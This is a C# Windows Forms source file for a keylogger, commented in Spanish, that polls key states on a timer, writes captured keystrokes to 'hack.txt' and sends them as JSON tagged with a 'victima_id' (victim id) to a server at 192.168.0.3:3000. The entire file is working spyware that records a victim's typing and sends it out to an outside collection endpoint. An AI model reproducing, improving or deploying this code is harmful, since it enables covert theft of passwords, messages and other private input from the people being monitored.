using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Configuration;
using System.Runtime.InteropServices;
using System.IO;
using System.Net.NetworkInformation;
using System.Net.Http;
using System.Net.Http.Headers;
using Newtonsoft.Json;

namespace Keylogger
{
   
    public partial class frmService : Form
    {
        #region DeclaracionVariables
        //declarar un timer
        private System.Windows.Forms.Timer timer;
        //obtener la tecla seleccionada por el usuario
        [DllImport("User32.dll")] private static extern short GetAsyncKeyState(int vKey);
        //variable para guardar el texto ingresado por el usuario
        string texto = "";
        #endregion

        #region MetodosPrivados
        // metodo para iniciar servicio 
        private void inicioServicio(object sender, EventArgs e)
        {
            try
            {
                //Instanciar el timer
                timer = new System.Windows.Forms.Timer();
                //Setear el intervalo del timer
                timer.Interval = Convert.ToInt32(ConfigurationManager.AppSettings["intervaloEjecucion"]);
                //habilitar el timer
                timer.Enabled = true;
                //cuando se cumpla el tiempo del timer ejecutar el evento Tempotizador
                this.timer.Tick += new EventHandler(EventoTemporizador);
            }
            catch (Exception ex)
            {

            }

        }

        //evento para enviar las teclas ingresadas por el usuario a un archivo
        private void EventoTemporizador(object sender, EventArgs e)
        {
            //variable para guardar los caracteres especiasles
            string buffer = "";
            //variable para guardar caracteres comunes
            string temp = "";
            
            //iterar en un for buscar la tecla que se ingreso
            
            foreach (System.Int32 i in Enum.GetValues(typeof(Keys)))
            {
                //si se ingreso una  tecla
                if (GetAsyncKeyState(i) == -32767)
                {
                    //iniciar el buffer vacio
                    buffer = "";
                    //guardar en el temporal la tecla ingresada
                    temp = Enum.GetName(typeof(Keys), i);

                    Console.WriteLine(temp);

                  

                    // Switch para guardar los caracteres especialews
                    switch (temp)
                    {
                        //si es un espacio
                        case "Space":
                            buffer += " ";
                            break;
                        //si se ingreso un enter
                        case "Enter":
                            //buffer += "\r\n";
                            buffer += "[<|]";
                            break;
                        case "LButton":
                            //Click Derecho
                            buffer += "[CI]";
                            break;
                        case "D1":
                            //Click Derecho
                            buffer += "1";
                            break;
                        case "D2":
                            //Click Derecho
                            buffer += "2";
                            break;
                        case "D3":
                            //Click Derecho
                            buffer += "3";
                            break;
                        case "D4":
                            //Click Derecho
                            buffer += "4";
                            break;
                        case "D5":
                            //Click Derecho
                            buffer += "5";
                            break;
                        case "D6":
                            //Click Derecho
                            buffer += "6";
                            break;
                        case "D7":
                            //Click Derecho
                            buffer += "7";
                            break;
                        case "D8":
                            //Click Derecho
                            buffer += "8";
                            break;
                        case "D9":
                            //Click Derecho
                            buffer += "9";
                            break;
                        case "D0":
                            buffer += "0";
                            break;
                        case "RButton":
                            //Click Derecho
                            buffer += "[CD]";
                            break;
                        default:
                            buffer += Enum.GetName(typeof(Keys), i);
                            break;
                    }
                }

            }
            //añadir el buffer al texto
            texto += buffer;

            
            //si se ingreso mas de 20 caracteres
            if (texto.Length > 20)
            {
                //enviar el texto ingresado a la funcion de guardar texto
                archivo(texto);
                //Declarar un cliente HTTP
                HttpClient client = new HttpClient();
                // declarar un objeto como instancia de la clase log  con el  id de la victima y la cadena de texto de las ultimos  20 eventos de teclado ingresados por la victima
                var log = new logClass { victima_id = "1", log = texto };
                //Guardar en un string el objeto instancia de logClass serializado como json
                string jsonString = JsonConvert.SerializeObject(log);
                // declarar el objeto json con el encode y el tipo  de dato como json para enviar en las cabeceras
                var stringContent = new StringContent(jsonString, Encoding.UTF8, "application/json");
                // declarar el objeto del cliente  http  con la url que ocupara
                client.BaseAddress = new Uri("http://192.168.0.3:3000/");
                // guardar la respuesta al ejecutar el envio de datos al  servidor
                var response = client.PostAsync("api/userLog/postKeylogger", stringContent).Result;
                //Si el envio fue exitoso
                if (response.IsSuccessStatusCode)
                {
                    //
                    Console.Write("Success");
                }
                // Si el envio no fue exitoso
                else
                {
                    //
                    Console.Write("Error");
                }


                //colocar el texto como vacio para no enviar datos guardados
                texto = "";


            }


        }
        //funcion para guardar archivo
        private void archivo(string txt)
        {
            // Crear un objeto stream writer para guardar el texto en un pad colocando como nombre "hack.txt"
            StreamWriter stream = new StreamWriter("hack.txt", true);
            //Escribir en el pad el texto que ingreso el usuario
            stream.Write(txt);
            //Cerrar el pad
            stream.Close();


        }

        #endregion
        public frmService()
        {
            InitializeComponent();
        }

        //metodo para detener el servicio
        private void detenerServicio(object sender, EventArgs e)
        {
            //deshabilitar el timer
            timer.Enabled = false;
            //detener el timer
            timer.Stop();
        }

        private void frmService_Load(object sender, EventArgs e)
        {

        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
    //Clase para  guardar id y  eventos de teclado de la victima
    public class logClass
    {
        //id de la victima
        public string victima_id { get; set; }
        //log de los  ultimos eventos de teclado
        public string log { get; set; }

      


    }
}
